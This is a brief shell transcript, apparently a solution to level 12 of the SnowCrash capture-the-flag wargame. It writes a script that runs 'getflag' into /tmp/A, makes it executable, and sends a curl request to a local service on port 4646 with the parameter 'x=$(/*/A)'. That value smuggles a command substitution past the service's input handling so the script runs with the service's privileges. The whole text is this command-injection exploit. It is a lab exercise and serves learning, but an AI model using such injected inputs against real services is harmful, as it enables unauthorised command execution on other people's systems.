echo "getflag > /tmp/test" > /tmp/A

chmod +x /tmp/A

level12@SnowCrash:~$ curl 'localhost:4646/?x=$(/*/A)'

cat /tmp/test
